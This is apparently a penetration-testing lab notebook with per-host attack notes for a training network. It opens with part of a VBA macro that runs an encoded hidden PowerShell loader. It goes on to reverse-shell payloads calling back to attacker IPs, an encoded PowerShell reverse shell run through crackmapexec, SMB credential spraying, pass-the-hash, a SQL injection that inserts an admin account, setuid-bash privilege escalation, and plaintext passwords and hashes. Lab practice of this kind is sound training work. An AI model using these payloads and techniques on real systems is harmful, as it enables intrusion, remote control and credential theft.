	Str = Str + "-w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTA"
	Str = Str + "GkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGU"
	Str = Str + "AcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAY"
	Str = Str + "gA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB"
	Str = Str + "3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTA"
	Str = Str + "GgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGw"
	Str = Str + "AbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZ"
	Str = Str + "QBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdAB"
	Str = Str + "pAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmA"
	Str = Str + "G8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHM"
	Str = Str + "ALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0Ad"
	Str = Str + "wAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQB"
	Str = Str + "wAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOA"
	Str = Str + "GUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8"
	Str = Str + "ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0AT"
	Str = Str + "wBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwB"
	Str = Str + "tAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhA"
	Str = Str + "G0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGU"
	Str = Str + "AbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAL"
	Str = Str + "ABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgB"
	Str = Str + "GAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoA"
	Str = Str + "CcAJwBIAHsAMAB9AHMASQBBAEYAWAA1AGoAVwBVAEMAQQA3AFY"
	Str = Str + "AVwBiAFcALwBpAE8AQgBEACsAJwAnACsAJwAnAHYAdABMACsAa"
	Str = Str + "AAyAGkARgBsAEsAQwBsAEoATAB4AHMAVwB5AHEAdABkAEEAewA"
	Str = Str + "wAH0AMABRAEYAcwBvAEwAKwBWADkAMABjAGwATgBUAEgAQgB4A"
	Str = Str + "FkAaABxAGIAQQByAHUAMwAvAC8AMwBHAGsATABSAFUAUwArADk"
	Str = Str + "ANgBKADIAMABrAGkARwBQAFAAagBNAGYAUABQAEQAUABqADIAU"
	Str = Str + "wB7ADEAfQAwAEoAZQBXAGgAdABxAGsAeQA3AGMAZgBIAEQAMQB"
	Str = Str + "yADgAdABIAEMARQBBADgAMQBJAFIAJwAnACsAJwAnAFYAZQBEA"
	Str = Str + "GoASgBiAGEAbgBLAFYAZgBsAGwASgBzAHQAaQBtAGMAYQBsADg"
	Str = Str + "AMQBZAHsAMAB9AEsAVwB5AHcAbwBQAE0AQQAyAG4ARgB4AGYAb"
	Str = Str + "ABWAFIAUwBSAFUATwA2AC8AcwAxAFUAaQBrAFIAQQBrAHUARwB"
	Str = Str + "lAFUAQwBDAE8AdAAvAGEAVQBOADUAaQBRAGkASgA3AGYAMwBEA"
	Str = Str + "DgAUwBWADIAZwA4AHQAOQBXAGUAMgB5AHYAZwA5AFoAcgBIAFk"
	Str = Str + "AdABvAHoAZABPAGQARgBPAFUATwBpAHsAMQB9AHQAUgB2AHUAW"
	Str = Str + "QB1AFYAWAB0AHIAdABrAFYAQgByADYAdAAyADkANgBlAG4ASwB"
	Str = Str + "TAG0AMgBZAHYASAAxAGUAWQBDAFUAUAB2AGIAbwBVAGsAUQBkA"
	Str = Str + "FoAagBUAEUAOQByAFAAOQBOAHEAdwA3AHYAdABrAGgAaAA2AGc"
	Str = Str + "ANwBvAFIARgAnACcAKwAnACcAMwB3AG0AcwB3AE0AYQBGAHYAT"
	Str = Str + "ABaAFgAaQBqAHcAagBEAFQAQgAyAGgATgB7ADEAfQBFAEQAbgB"
	Str = Str + "uAG4AdABEAGgATgBDAC8AbgBpAFkAaABjAFIAVwBGADgATABHA"
	Str = Str + "FYAbgBMADIAWABvAE0ARwB4AEYAMwBFAFcAZQBGAHgARQBoADk"
	Str = Str + "ASQB3ADIAVQBUAHQAJwAnACsAJwAnAE0AewAxAH0AdABNAC8Aa"
	Str = Str + "gAnACcAKwAnACcARQBtADgAZgBXAGMAVgBTAGgAcQBRAGIARAA"
	Str = Str + "yAFUASgBPAEwATABMAG8AbQBlAHEAJwAnACsAJwAnAEUAdABFA"
	Str = Str + "HQAbwBaAEQAagA1AEUATwBtAFUAMQBCAHEAeQBzAGoARwB2AHI"
	Str = Str + "AVABkAEIAcgBFAG4AdgBpAEMARwBLAGwAdwB4AFYAaABHACsAe"
	Str = Str + "QA5AG0AagBDAFoAWgBKACcAJwArACcAJwArAEMAOQBWADgAawB"
	Str = Str + "7ADAAfQBWAEEASwB7ADEAfQBsAG8AegBTAEcAWQBqAHsAMQB9A"
	Str = Str + "HMAWQBNADIAdQBMAGQAaQBaAEsAKwBxAEgALwBGAFUARQBTAEU"
	Str = Str + "ATgB6ADUAewAwAH0ATQBnAE4AOQBQAEIAZQBFAHMAWQBZAC8AU"
	Str = Str + "ABxAHsAMQB9ADAAagAnACcAKwAnACcAOQBIAG0AWgBTAEoANwB"
	Str = Str + "KAGIAbwBXAEEAeAAwAGEATABDADcAewAxAH0AVAAvAHEAewAxA"
	Str = Str + "H0AWgBHAGEAMABCAFcAMgBQAEoAbwB5ADEAOAB7ADEAfQB1ADY"
	Str = Str + "AaQBGAFUAbABQAG4ALwBIAFcAVQBoAHoAWgBtAGYAYwBhAHkAe"
	Str = Str + "QBXAGEAJwAnACsAJwAnAG8ATQBjAEUAVABFAHoANgBuAEgAcgB"
	Str = Str + "UAEYALwBWAFgAMABVAC8AeAB1AHsAMAB9ADYAUwBlAFoAdgBLA"
	Str = Str + "EYAVABLAGoASQBhAGwAcwBRAHgAeABRAE4AMgBHAHIAYwBTAHc"
	Str = Str + "AZwBaAE0AYgBJAEQAbwA5AHMASQB0AFkARQA5AHcAdwA5AFgAa"
	Str = Str + "QBCAGUAaABUAEQAaQBZADYAawBRAFYAcgB6AHsAMAB9AFIAZQA"
	Str = Str + "wAHkAbwBQAEoAWgAxADEANQBSADUAewAxAH0ARQBJAHUAUgBCA"
	Str = Str + "FUAQQBWADUAQgB2AE4ATwB2AG4AZABrAEgAegBkAEQAcgBZACc"
	Str = Str + "AJwArACcAJwBZAE0ARQBBAE4AMwArAEcAewAwAH0AaQBhAG0Aa"
	Str = Str + "wBHAE8AawBFAFEANgB6AG8AdAB0AHMAcgB2ADYAQgBpAEcAOQB"
	Str = Str + "6AEwAQQBRAEcAYQAyADEAZwBpAFIAMQBNADEAcQBYAFkARQBhA"
	Str = Str + "DgAagBJAFoAQwBRAGUATQBsAHQASgBKADgATgA5AFIAZgAzAEc"
	Str = Str + "AMgBzAG0ASwBRAHUARgBqAEkAeABOADAAMgAvAFIAagBQAGUAd"
	Str = Str + "ABjAHgARABJAGEATwBWAEMAegBFAEYAQgBPADYANgBTACsASgB"
	Str = Str + "TAHoAQgBRAGcARwBhADEARwBQAFcASgB2AHUAOQBSAFAAZAB0A"
	Str = Str + "GUAUAB3AGwASABHAGoARQBIAG0AZwBLAFUAbgBDAEEAZgBNAEs"
	Str = Str + "AQgBpADYAVQBqAEUAbABBAGsAYwBWAEsAOQBMAFoATAB7ADEAf"
	Str = Str + "QBIADEAWQBNAGwASQBBAEMASwA3AGsAdQBFAHcANwBFAE8AQgB"
	Str = Str + "pAE4ATgBqAHgAeQB6AHMARQAwADgALwA3AG0AYQBTAEEAMwB2A"
	Str = Str + "EMASwAxAGcAUwBQAEEANgBjAGgARgBoADMARwBaAGMAWgByAFU"
	Str = Str + "AOABqAEMAZgBWAEgAUQBjAHoARQAvAC8ASABnADEANwBLAGoAW"
	Str = Str + "ABDAGwASABKAEkANgBMAGsAYQBUAFcAeABOADUASwB4AGYAMwB"
	Str = Str + "VAHsAMQB9AGwAVgBTAC8ASQB6AFIAMgBXAEUAUgBTAGMARABCA"
	Str = Str + "GkAWABoAGcAWQAwAEYATwBpAC8AdgA2AFkAbgB3AHkAYgAyAGs"
	Str = Str + "ATAB3AFQATwBxAGgANgB6AGgAWABTADEAbwByAHIANgBHAFgAd"
	Str = Str + "wBOACsAUABWAHEAbwA4ADgAcQBaAGQAMwAzADEAVQBEAE0AYgB"
	Str = Str + "iAGwAbQAwAHEAcwB7ADAAfQA1AG8AbQB0AC8ANwBaAHsAMAB9A"
	Str = Str + "DMAawBlAHQAZABlAGEAVABVAEIAYgBrADIAdABlAHIAbgAvAFg"
	Str = Str + "AVQBOADMAbgBaAHgANwB0AHIAVwBIAFYASgBqAGYAMABSAHoAd"
	Str = Str + "gBvACsAOABaAG4AdgB1AE0AcQB0AFYAcQBaAG4AZABrAGIARAB"
	Str = Str + "vAHUAagBaAG8AdQBCAFgANwArAHoAbwB2AGcASwBYAEYAWQBtA"
	Str = Str + "DEAbwBvAFUASwBoAGUARgB1AHcARgBnAEMAZAAwAGwAbQBBAFQ"
	Str = Str + "AawBEAFgAbQB4AHMAWQBRAHkARwA5AHYAYgBIAHIAdwByAGIAc"
	Str = Str + "QA3AFAASwBxADMATABrAGYANQBKADMAeABnAE4AWABNAG8AagB"
	Str = Str + "PAGYARABiAGoAbwBuAG8AewAwAH0AcQB7ADEAfQBtAG0AVwBQA"
	Str = Str + "EYAeAB7ADEAfQBiAEIARwB5AHUAVgBkAG8AYgBJAGUANQBEAHI"
	Str = Str + "AKwByAHUAWQBGAGQARABMACcAJwArACcAJwBsAFoASwBoAGMAW"
	Str = Str + "AA2AEIASwBoAGMAbgBqAFoAZAAyAHgAKwBQAGIAJwAnACsAJwA"
	Str = Str + "nAEkAagAxAEQATAA3ADIARgAvAHkAOQBiAFUAdgB2AHcAegA4A"
	Str = Str + "E0AawBMAFYATQAwAHIARwA3AFoANQBqAHQAOQB1AE8AagBYAHI"
	Str = Str + "AVgBoADgAZABLAHkAZgBUAE4AMABtAEMASQA1AC8AYQBnACcAJ"
	Str = Str + "wArACcAJwBuADYAZgBqADUAYgBBAHoAaAAyADgASABqAG4AbAB"
	Str = Str + "0AFcAcwBXADYAUgA3ADcAegA4AFIAcQBBAHEAMwBLAEUALwBRA"
	Str = Str + "DcASQArAE8AVwA4AE8ANQArAEIAVABPAFUAegBzAGoAOAAzAHU"
	Str = Str + "AYwBqAGoAaABRADIAeABCAGgAbABuAC8ASQBpAHEAOAA5AEgAU"
	Str = Str + "wBhAFQARgBZAHYAKwB2AGwATwBlAHEAegA1AGgAQwBqAG0ALwB"
	Str = Str + "IAFcATQBjADMAYwBxAEYAVgBFAE4AWQBzAFAAcQBqADUAcQBnA"
	Str = Str + "HoAagAyADcAVABaAEcAewAwAH0AcQBuAHkAdgBXAEwAbQArAGg"
	Str = Str + "ANwAzAEIAbAArAGEAbwA1AG4AWgBIADcASQB6AHMAMQBKAHUAd"
	Str = Str + "AArAFoARABkAFcAWgAnACcAKwAnACcAegBHAGEAagAvAGQAYQA"
	Str = Str + "xAHkANwBZADUAegBhAC8AZgAyADcAUAB4AG0AUQBQAHMAQgBSA"
	Str = Str + "HoAMwBUADcASAA4AEMAVABrAHgANgBOAEoAUwBGAC8ARABUADE"
	Str = Str + "ASgBKAHcAUwBWAGkAWAB6AHsAMAB9AHsAMAB9AGYAVQA5AHMAd"
	Str = Str + "wArAEgAUgA2AFEAewAwAH0ANgAyAE8AMABNAEMAUgBtAEcATQB"
	Str = Str + "HAHsAMQB9AEkARgBLAG4ANgBTAHQAdwB5AE0AbgBMAHQAOAB0A"
	Str = Str + "FQAewAxAH0AVwBHAFkAYQBoAEwAdwBJAEoARQBJAFcASABRAE8"
	Str = Str + "AJwAnACsAJwAnAEsARwAxAEoAbgB4AEgAagBIAEYAWAA5AFkAN"
	Str = Str + "QBkAG4AWQBlACsAdABlADgAbQBxAHIAbgAxADYAagB1AC8AagB"
	Str = Str + "vADMAUwAyAHIATgBnACsAcQBXAGwASgBGAE0AWABGADIATgB3A"
	Str = Str + "FUAdgBXAFQAVgBpAGwANwBRADAASgBmAHoAagBQAFcAewAxAH0"
	Str = Str + "AJwAnACsAJwAnAG0AQgBaADAAQQB5AHMAagBWAFgAYwBKAGMAd"
	Str = Str + "gA3AFQAMQBiAG0AeQA2ADIAaABiAEcAVgBVAE4AOQBsAEQARQB"
	Str = Str + "4AHQAbgBPACsATgBnAGoAOAB7ADAAfQAwAHcALwBqAHQAWQBNA"
	Str = Str + "EcAZABRAFUASQBCAGUAeAB1AHUAdAA1AEMARAByAFIAZABRAGM"
	Str = Str + "AYQBBAEEANwBpAHUAQgB3AHMALwBtAG4AQgAyAGkAbAB4AHoAc"
	Str = Str + "wBtAFEAOABIADYAQQBGAHMATwBUAGoANwBSAE4AMABYADkAagB"
	Str = Str + "3AEIARQB5AGYAawBVAFUAdABKADEAVQA4AFAAKwAzAFAAcQBvA"
	Str = Str + "FYAaQB1AC8AbABiAG0AeABDAFYAdAAnACcAKwAnACcARABpAC8"
	Str = Str + "AdgAzADUAagB6AE0AdgBjAFAAcQArADkAaQBrADUAVwBKAEEAZ"
	Str = Str + "gB7ADEAfQBsAC8AdgBYAEUAUQBTAC8AewAwAH0AZgBSAEEATQB"
	Str = Str + "NAEoAVQBnADIASQBYAGkAegBNAGoAKwBxAG4AQQBjAGkAVABoA"
	Str = Str + "GQARABxAEsAJwAnACsAJwAnAHMAdwBnAFAAWgBNAEkAcwBmAGQ"
	Str = Str + "AWAArACsAWABjAG0AVABKACcAJwArACcAJwB0ACcAJwArACcAJ"
	Str = Str + "wB6AEcAZAB2ADMAaABiADAAVgBoAEYAUgB1ADMAQwB3AEEAQQA"
	Str = Str + "nACcAKQAtAGYAJwAnADQAJwAnACwAJwAnAHAAJwAnACkAKQApA"
	Str = Str + "CkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGU"
	Str = Str + "AcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0Ab"
	Str = Str + "wBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQA"
	Str = Str + "uAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuA"
	Str = Str + "FUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGE"
	Str = Str + "AbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAb"
	Str = Str + "gBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJAB"
	Str = Str + "zAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkA"
	Str = Str + "GUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQ"
	Str = Str + "AbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAb"
	Str = Str + "QAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQB"
	Str = Str + "zAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="


    CreateObject("Wscript.Shell").Run Str
End Sub
```

.222
```bash
nmap 192.168.213.222
sudo nmap -sU --open -p 161 192.168.213.222

# ports 135,139,445,2994(veritas-vis2),5985(wsman),47001(winrm),49664-49670

# enumerate smb - we need a password to do anything
enum4linux 192.168.213.222
nmap -v -p 139,445 --script smb-os-discovery 192.168.213.222
smbclient -L 192.168.213.222
smbmap -H 192.168.213.222

crackmapexec winrm 192.168.186.222 -u backup_service -p pIt4Server --continue-on-success --local-auth
impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@192.168.186.222
```

.223 (milan) (standalone)
```bash
nmap 192.168.213.223
sudo nmap -sU --open -p 161 192.168.213.223

# 80,443 show up, but are closed, 161 open
# fastest nmap scan (-pN, -sT make it slower)
sudo nmap -p- -Pn 192.168.213.223 -sS -T 5 --verbose
nmap -sT -A -p 60001 192.168.213.223

# enumerate webserver at 60001
gobuster dir -u http://192.168.213.223:60001 -w /usr/share/wordlists/dirb/common.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.213.223:60001

# find http://192.168.213.223:60001/docs/release_notes.pdf - # osCommerce 2.3.4.1
# find https://www.exploit-db.com/exploits/44374

# run to get shell on 443
python3 44374.py

# source for shells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
# Does not work
my_shell_file = open("/home/kali/relia/shell.php")
shell_data = my_shell_file.read()

# bash -e does not work
payload += 'system("nc -e /bin/bash 192.168.45.160 443");'

# doesn't work, probably not using file descriptor 3
payload += '$sock=fsockopen("192.168.45.160",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# This one works. (alternative if nc -e does not work)
payload += 'system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.160 443 >/tmp/f");'

nc -nvlp 443
```

.223 privesc
```bash
wget http://192.168.45.160/linpeas.sh -O linpeas.sh

# findings
# root is running an apache2 process
# writable /var/www/html/froxlor, also a github repo
# so there's an apache server running on 60002 (and 80?) that's running this froxlor thing, owned by root - we know what is running where because linpeas outputs apache configs
# users milan and sarah, milan is in the adm and sudo groups
# port 60002, 631, 3306, 22 are active on the box (see active ports section from linpeas)
# this command would show you what is on 60002 but we aren't root
netstat -ltnp | grep -w ':60002'
netstat -ltnp | grep -w ':80'
# find db creds
db=oscdb, user=oscuser, password=7NVLVTDGJ38HM2TQ
# local.txt is in /root

searchsploit -m 51263

chisel server --port 80 --reverse
sudo tcpdump -nvvvXi tun0 tcp port 8081
wget http://192.168.45.160/chisel -O chisel

# need to use port 80 because other ports seem to be blocked. we need to use a port that's open on the target machine
./chisel client 192.168.45.160:80 R:60002:0.0.0.0:60002

# try froxlor RCE exploit - https://github.com/mhaskar/CVE-2023-0315
wget https://raw.githubusercontent.com/mhaskar/CVE-2023-0315/main/froxlor-rce.py
python3 froxlor-rce.py http://127.0.0.1:60002 admin password 182.168.45.160 9999

# can't login. let's see if we can access the internal mysql server using previously found creds
# from target
./chisel client 192.168.45.160:80 R:3306:0.0.0.0:3306
# from kali - pw: 7NVLVTDGJ38HM2TQ
mysql -u oscuser -D oscdb -h 127.0.0.1 -p
select * from administrators;
# find a user (admin) and password hash
$P$DVNsEBdq7PQdr7GR65xbL0pas6caWx0 
hashid admin.md5.hash # phpass
hashcat --help | grep 'phpass' # mode 400
hashcat -m 400 admin.md5.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# we need to get into the froxlor DB instead of sscdb to get password hashes
/etc/mysql/my.cnf
/etc/mysql/mariadb.cnf 
/var/www/html/froxlor/.github
/var/www/html/froxlor/logs
/var/www/html/froxlor/admin_configfiles.php - says it has mysql password FROXLOR_MYSQL_PASSWORD

# turns out we can just use the same password of the oscdb user as root 
use froxlor;
select loginname, password from panel_admins;
select * from panel_customers;
$5$b50069d236c187f2$PIeKl3JO.NJ5X0hhtHjmJx9nDtImDP61/x4D8Rv/Gu/ 
hashid panel.hash # [+] SHA-256 Crypt 
hashcat --help | grep 'crypt' # 7400 | sha256crypt $5$, SHA256 (Unix)  
# not able to crack admin password
hashcat -m 7400 panel.hash /usr/share/wordlists/rockyou.txt
# able to crack - Christopher
hashcat -m 7400 flybike.hash /usr/share/wordlists/rockyou.txt

# need to use a different exploit, as the first one requires that you already have the admin creds
# use #4 from here: https://www.exploit-db.com/exploits/50502
# add the following to the db name in 'create database'
`;insert into panel_admins (loginname,password,customers_see_all,domains_see_all,caneditphpsettings,change_serversettings) values ('x','$5$ccd0bcdd9ab970b1$Hx/a0W8QHwTisNoa1lYCY4s3goJeh.YCQ3hWqH1ZUr8',1,1,1,1);--

# settings -> webserver -> webserver reload command as administrator, then reload configuration files
# the shell back doesn't work probably because i'm already using the ports 80,, 443
# changing bash to suid binary then executing bash -p is another great way to get root shell  
nc -e bash 192.168.45.160 443
chmod u+s /usr/bin/bash
bash -p

# where I installed linpeas
/var/www/html/oscommerce/catalog/install/includes
```

.224
```
nmap 192.168.248.224
sudo nmap -sU --open -p 161 192.168.248.224
sudo nmap -p- -Pn 192.168.248.224 -sS -T 5 --verbose
nmap -sT -A -p 8000,3128 192.168.248.224

# ports open: 22, 3128 (squid), 8000

# enumerate squid - Squid http proxy 4.10
# https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid
# Squid is a caching and forwarding HTTP web proxy.

# enumerate webserver
whatweb 192.168.248.224:8000

feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.248.224:8000
# find http://192.168.248.224:8000/debug.txt, is just output of ifconfig, showing connection to interntal 172.x network
```

.225 (singapore) (standalone)
```
nmap 192.168.248.225
sudo nmap -sU --open -p 161 192.168.248.225
sudo nmap -p- -Pn 192.168.248.225 -sS -T 5 --verbose
nmap -sT -A -p 80,8090 192.168.248.225

# open ports: 21, 80, 8090

# enumerate ftp
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.248.225

# enumerate webserver port 80
whatweb 192.168.248.225
nikto -host 192.168.248.225 -port 80
sudo nmap -sV -p 80 --script "vuln" 192.168.248.225
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.248.225

# enumerate webserver port 8090
whatweb 192.168.248.225:8090
nikto -host 192.168.248.225 -port 8090
sudo nmap -sV -p 8090 --script "vuln" 192.168.248.225
gobuster dir -u http://192.168.248.225:8090 -w /usr/share/wordlists/dirb/big.txt
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.248.225:8090
# find http://192.168.248.225:8090/backend/default/uploads/ but 403
gobuster dir -u http://192.168.248.225:8090 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf

# try php files always if we can't find anything. in this case we found some directories but no files inside the directories
feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt --url http://192.168.248.225:8090/backend/default

# on index.php, log in with admin:admin
# we need to test a bunch of default creds such as admin:password, or admin:admin

# can only upload a file that looks like a pdf so we need to add this to the top of our php shell file, but use the .php extension
%PDF-1.5
# go here to catch shell
http://192.168.248.225:8090/backend/default/uploads/shell.php
```

.224 privesc
```
wget http://192.168.45.160/linpeas.sh -O linpeas.sh

# this produces a bash one-liner
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.160 LPORT=4444 -f raw -o shell.sh
wget http://192.168.45.160/shell.sh -O shell.sh

/var/log/nginx/access.log
/var/www/backend/default/config.php
/var/lib/php/sessions
/var/metrics
/var/tmp

/root/local.txt

pg_connect("host=localhost port=5432 dbname=webapp user=postgres password=EAZT5EMULA75F8MC");

wget http://192.168.45.160/chisel -O chisel
./chisel client 192.168.45.160:8090 R:5433:0.0.0.0:5432

# run this from the target
python3 -c 'import pty; pty.spawn("/bin/sh")'
sudo psql -h 127.0.0.1 -p 5432 -U postgres

# try this exploit
https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/postgres/postgres_copy_from_program_cmd_exec.md

# the above exploit gives you a shell as the postgres user, sudo -l tells you that we can run the psql command using sudo
# https://gtfobins.github.io/gtfobins/psql/ - exploit using this

/usr/share/doc/vsftpd/examples/INTERNET_SITE/vsftpd.conf
/usr/lib/tmpfiles.d/vsftpd.conf
/usr/share/nginx
etc/nginx/nginx.conf
/etc/php/7.4/cli/php.ini
/etc/nginx/

# try to find passwords
https://juggernaut-sec.com/password-hunting-lpe/

/d:skylark /u:kiosk /p:XEwUS^9R2Gwt8O914 
# as it turns out the password we need is right in front of us
http://192.168.248.225:8090/backend/default/uploads/user-guide-rdweb.pdf

grep --color=auto -rnw -iIe "PASSW\|PASSWD\|PASSWORD\|PWD" --color=always 2>/dev/null
grep --color=auto -rnw '/' -iIe "kiosk" --color=always 2>/dev/null

find . -type f -iname '*.pdf'
```

.250 (10.10.84.250) (DC?)
```bash
# don't need these creds as we can use domain admin to login
# Use creds: helpdesk_setup:Tuna6Helper

nmap 10.10.84.250

crackmapexec smb 10.10.84.250 -u backup_service -p It4Server --continue-on-success
crackmapexec smb 10.10.84.250 -u backup_service -p 'It4Server' -X "whoami"
crackmapexec smb 10.10.84.250 -u backup_service -p 'It4Server' -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA5ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

Get-Childitem -recurse -filter "proof.txt" -ErrorAction SilentlyContinue

# find a C:\credentials.txt
Local Admin Passwords:

- PARIS: MusingExtraCounty98
- SYDNEY: DowntownAbbey1923

```

.226 (192)
```

```

.227 (192)